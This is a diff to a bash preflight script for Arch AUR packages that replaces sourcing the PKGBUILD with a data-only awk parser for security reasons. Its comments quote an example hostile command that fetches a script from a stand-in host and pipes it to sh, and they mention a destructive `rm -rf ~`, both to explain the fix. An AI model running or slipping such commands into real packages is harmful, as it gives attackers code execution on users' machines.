@@ -55,7 +55,7 @@ note() { echo "aur-preflight: $*" >&2; fail=1; }
 # Name the missing tool rather than failing later with a message that sends the
 # reader into the PKGBUILD. curl is handled separately, further down, because
 # --offline is a legitimate way to do without it.
-for _tool in awk sed mktemp env; do
+for _tool in awk sed mktemp; do
     command -v "$_tool" >/dev/null 2>&1 || {
         echo "aur-preflight: $_tool is required and not on PATH" >&2
         exit 2
@@ -77,41 +77,132 @@ if ! bash -n PKGBUILD 2>"$tmp/syntax"; then
 fi
 
 # ${pkgver} inside a source URL has to be compared expanded, not as source text,
-# so the values have to be evaluated rather than read with sed. Sourcing the whole
-# PKGBUILD would do it, and is what makepkg does at build time, but a preflight
-# script reads as "only checks" and must not run someone's package: a top level
-# `rm -rf ~` in a PKGBUILD you are inspecting would fire here. So slice out the
-# top level assignments first, functions and commands left behind, and evaluate
-# only those, in a subshell with an empty environment.
-awk '
-    # Continuation lines of a multi-line array, until the parentheses balance.
-    depth > 0 {
-        print
-        depth += gsub(/\(/, "(")
-        depth -= gsub(/\)/, ")")
+# so the values cannot simply be read with sed. The obvious way to expand them is
+# to source the PKGBUILD, which is what makepkg does at build time, but a
+# preflight script reads as "only checks" and must not run someone's package.
+#
+# An earlier version of this script sliced out the top level assignments and
+# sourced only those, in a subshell with an empty environment, believing that
+# left the commands behind. It does not: an assignment is executable syntax, so
+# `pkgver=$(curl evil.sh | sh)` is a top level assignment and runs when sourced.
+# `env -i` clears variables, it is not a sandbox. So the PKGBUILD is now read as
+# DATA: awk extracts literal assignments only, refuses anything that could
+# execute, and expands ${pkgname}/${pkgver} itself. Nothing from the file is ever
+# passed to a shell.
+if ! awk '
+    function die(msg) { print "ERR " msg > "/dev/stderr"; dying = 1; exit 1 }
+    # What counts as a literal depends on the quoting, exactly as the shell reads
+    # it. Single quotes make the content inert, so anything inside is data. Double
+    # quotes still expand $ and backticks, but leave (, ), ;, | and friends as
+    # ordinary characters, so refusing those would reject a legitimate pkgdesc.
+    # A bare token has nothing protecting it, so only inert characters are allowed.
+    # Whatever survives is expanded (pkgname/pkgver only) and must then carry no $
+    # at all: an expansion we do not resolve is one we cannot vouch for.
+    function literal(v,    inner) {
+        if (v ~ /^'"'"'[^'"'"']*'"'"'$/) return substr(v, 2, length(v) - 2)
+        if (v ~ /^"[^"]*"$/) inner = substr(v, 2, length(v) - 2)
+        else if (v ~ /^[A-Za-z0-9._:+@,\/~=%?&#${}-]+$/) inner = v
+        else return "\001"
+        if (inner ~ /[`\\]/) return "\001"
+        inner = expand(inner)
+        if (index(inner, "$") > 0) return "\001"
+        return inner
+    }
+    # Only ${pkgname} / ${pkgver} (and the unbraced forms) are resolved, because
+    # they are the only expansions an AUR source line legitimately needs here.
+    function expand(v) {
+        gsub(/\$\{pkgname\}/, pkgname, v); gsub(/\$pkgname/, pkgname, v)
+        gsub(/\$\{pkgver\}/,  pkgver,  v); gsub(/\$pkgver/,  pkgver,  v)
+        return v
+    }
+    # Emit every literal on one array line. PKGBUILDs write arrays both one entry
+    # per line and several entries on one line; both are ordinary, so the parser
+    # tokenises rather than treating a second entry as shell syntax.
+    function emit_items(name, text,    rest, tok, val, n) {
+        rest = text
+        n = 0
+        while (1) {
+            sub(/^[[:space:]]+/, "", rest)
+            if (rest == "") return n
+            if (rest ~ /^"/)        { if (match(rest, /^"[^"]*"/) == 0) die("unterminated quote in " name) }
+            else if (rest ~ /^'"'"'/) { if (match(rest, /^'"'"'[^'"'"']*'"'"'/) == 0) die("unterminated quote in " name) }
+            else                    { match(rest, /^[^[:space:]]+/) }
+            tok = substr(rest, RSTART, RLENGTH)
+            rest = substr(rest, RSTART + RLENGTH)
+            val = literal(tok)
+            if (val == "\001") die("array " name " carries shell syntax: " tok)
+            print (name == "source" ? "SOURCE " val : "SHA256 " val)
+            n++
+        }
+    }
+    # Inside an array, until the closing parenthesis.
+    arr != "" {
+        line = $0
+        sub(/[[:space:]]*#.*$/, "", line)
+        sub(/^[[:space:]]+/, "", line); sub(/[[:space:]]+$/, "", line)
+        if (line == "") next
+        closes = 0
+        if (line ~ /\)$/) { closes = 1; sub(/[[:space:]]*\)$/, "", line) }
+        if (line != "") emit_items(arr, line)
+        if (closes) arr = ""
         next
     }
-    # A top level assignment: name= at column zero. Anything indented belongs to a
-    # function body, and a command never matches this.
+    # A top level assignment. Anything indented belongs to a function body.
     /^[A-Za-z_][A-Za-z0-9_]*=/ {
-        print
-        depth = gsub(/\(/, "(") - gsub(/\)/, ")")
+        eq = index($0, "="); name = substr($0, 1, eq - 1); rest = substr($0, eq + 1)
+        if (name != "pkgname" && name != "pkgver" && name != "pkgrel" && \
+            name != "pkgdesc" && name != "source" && name != "sha256sums") next
+        if (rest ~ /^\(/) {
+            if (name != "source" && name != "sha256sums") die(name " must be a scalar")
+            sub(/^\(/, "", rest)
+            arr = name
+            sub(/^[[:space:]]+/, "", rest); sub(/[[:space:]]+$/, "", rest)
+            if (rest == ")") { arr = ""; next }
+            if (rest != "") {
+                closes = 0
+                if (rest ~ /\)$/) { closes = 1; sub(/[[:space:]]*\)$/, "", rest) }
+                if (rest != "") emit_items(name, rest)
+                if (closes) arr = ""
+            }
+            next
+        }
+        if (name == "source" || name == "sha256sums") die(name " must be an array")
+        val = literal(rest)
+        if (val == "\001") die(name " is not a literal assignment: " rest)
+        if (name == "pkgname") pkgname = val
+        if (name == "pkgver")  pkgver  = val
+        print "SCALAR " name " " val
         next
     }
-' PKGBUILD > "$tmp/assignments"
-
-if ! env -i "$(command -v bash)" --noprofile --norc -c '
-        set -u
-        # shellcheck disable=SC1090
-        . "$1" >/dev/null 2>&1 || exit 1
-        declare -p pkgname pkgver pkgrel pkgdesc source sha256sums 2>/dev/null
-    ' _ "$tmp/assignments" > "$tmp/vars" 2>/dev/null || [ ! -s "$tmp/vars" ]; then
-    note "PKGBUILD does not evaluate, or declares none of pkgname/pkgver/source/sha256sums"
+    # `exit` runs END too, so a second complaint would follow the real one.
+    END { if (!dying && arr != "") die("unterminated array " arr) }
+' PKGBUILD > "$tmp/fields" 2>"$tmp/parse.err"; then
+    note "PKGBUILD is not a plain literal package definition, so it cannot be checked without running it"
+    sed 's/^ERR /    /' "$tmp/parse.err" >&2
     echo "aur-preflight: FAILED" >&2
     exit 1
 fi
-# shellcheck disable=SC1090
-. "$tmp/vars"
+
+# Read the extracted fields as data. No `source`, no `eval`: the values reach the
+# shell through `read`, so nothing in the PKGBUILD can execute even now.
+pkgname=""; pkgver=""; pkgrel=""; pkgdesc=""
+source=(); sha256sums=()
+while IFS= read -r _line; do
+    case "$_line" in
+        "SCALAR pkgname "*)  pkgname="${_line#SCALAR pkgname }" ;;
+        "SCALAR pkgver "*)   pkgver="${_line#SCALAR pkgver }" ;;
+        "SCALAR pkgrel "*)   pkgrel="${_line#SCALAR pkgrel }" ;;
+        "SCALAR pkgdesc "*)  pkgdesc="${_line#SCALAR pkgdesc }" ;;
+        "SOURCE "*)          source+=("${_line#SOURCE }") ;;
+        "SHA256 "*)          sha256sums+=("${_line#SHA256 }") ;;
+    esac
+done < "$tmp/fields"
+
+if [ -z "$pkgname" ] || [ -z "$pkgver" ] || [ "${#source[@]}" -eq 0 ] || [ "${#sha256sums[@]}" -eq 0 ]; then
+    note "PKGBUILD declares none of pkgname/pkgver/source/sha256sums as literals"
+    echo "aur-preflight: FAILED" >&2
+    exit 1
+fi
 
 srcfield() { sed -n "s/^[[:space:]]*$1 = //p" .SRCINFO | head -1; }
 mapfile -t srcinfo_sources < <(sed -n 's/^[[:space:]]*source = //p' .SRCINFO)
@@ -119,40 +210,33 @@ mapfile -t srcinfo_sums    < <(sed -n 's/^[[:space:]]*sha256sums = //p' .SRCINFO
 
 # 2. .SRCINFO is what the AUR and every helper read. A PKGBUILD fix that never
 #    reached it ships the old package to users while looking fixed locally.
-if command -v makepkg >/dev/null 2>&1; then
-    if ! makepkg --printsrcinfo > "$tmp/srcinfo" 2>"$tmp/srcinfo.err"; then
-        note "makepkg --printsrcinfo failed"
-        sed 's/^/    /' "$tmp/srcinfo.err" >&2
-    elif ! diff -q "$tmp/srcinfo" .SRCINFO >/dev/null; then
-        note ".SRCINFO does not match PKGBUILD (regenerate: makepkg --printsrcinfo > .SRCINFO)"
-        diff -u .SRCINFO "$tmp/srcinfo" | sed 's/^/    /' >&2
-    fi
+# `makepkg --printsrcinfo` would regenerate .SRCINFO for an exact diff, and it is
+# deliberately NOT used: makepkg sources the PKGBUILD, which is the one thing this
+# script must not do. The value comparison below is what runs everywhere, on Arch
+# and off it, and it catches the same drift: every scalar, every source entry and
+# every checksum is compared one by one, so a digest bumped in the PKGBUILD alone
+# cannot hide behind equal entry counts.
+for k in pkgname pkgver pkgrel pkgdesc; do
+    p="${!k-}"; s=$(srcfield "$k")
+    [ "$p" = "$s" ] || note "$k differs: PKGBUILD='$p' .SRCINFO='$s'"
+done
+if [ "${#source[@]}" -ne "${#srcinfo_sources[@]}" ]; then
+    note "PKGBUILD has ${#source[@]} sources, .SRCINFO has ${#srcinfo_sources[@]}"
 else
-    # Off Arch (.SRCINFO is hand-edited there) compare every value, not just the
-    # scalars: a checksum bumped in the PKGBUILD alone leaves users on the old
-    # digest, and equal entry counts hide it.
-    for k in pkgname pkgver pkgrel pkgdesc; do
-        p="${!k-}"; s=$(srcfield "$k")
-        [ "$p" = "$s" ] || note "$k differs: PKGBUILD='$p' .SRCINFO='$s'"
-    done
-    if [ "${#source[@]}" -ne "${#srcinfo_sources[@]}" ]; then
-        note "PKGBUILD has ${#source[@]} sources, .SRCINFO has ${#srcinfo_sources[@]}"
-    else
-        for i in "${!source[@]}"; do
-            [ "${source[$i]}" = "${srcinfo_sources[$i]}" ] || \
-                note "source[$i] differs:
+    for i in "${!source[@]}"; do
+        [ "${source[$i]}" = "${srcinfo_sources[$i]}" ] || \
+            note "source[$i] differs:
     PKGBUILD: ${source[$i]}
     .SRCINFO: ${srcinfo_sources[$i]}"
-        done
-    fi
-    if [ "${#sha256sums[@]}" -ne "${#srcinfo_sums[@]}" ]; then
-        note "PKGBUILD has ${#sha256sums[@]} sha256sums, .SRCINFO has ${#srcinfo_sums[@]}"
-    else
-        for i in "${!sha256sums[@]}"; do
-            [ "${sha256sums[$i]}" = "${srcinfo_sums[$i]}" ] || \
-                note "sha256sums[$i] differs: PKGBUILD='${sha256sums[$i]}' .SRCINFO='${srcinfo_sums[$i]}'"
-        done
-    fi
+    done
+fi
+if [ "${#sha256sums[@]}" -ne "${#srcinfo_sums[@]}" ]; then
+    note "PKGBUILD has ${#sha256sums[@]} sha256sums, .SRCINFO has ${#srcinfo_sums[@]}"
+else
+    for i in "${!sha256sums[@]}"; do
+        [ "${sha256sums[$i]}" = "${srcinfo_sums[$i]}" ] || \
+            note "sha256sums[$i] differs: PKGBUILD='${sha256sums[$i]}' .SRCINFO='${srcinfo_sums[$i]}'"
+    done
 fi
 
 [ "${#source[@]}" -eq "${#sha256sums[@]}" ] || \
@@ -208,7 +292,7 @@ if [ "$fail" -ne 0 ]; then
     exit 1
 fi
 if [ "$offline" -eq 1 ]; then
-    echo "aur-preflight: PKGBUILD sourceable, .SRCINFO in sync, sources NOT checked (--offline)"
+    echo "aur-preflight: PKGBUILD parses as literals, .SRCINFO in sync, sources NOT checked (--offline)"
 else
     echo "aur-preflight: PKGBUILD sourceable, .SRCINFO in sync, ${#urls[@]} sources resolve"
 fi
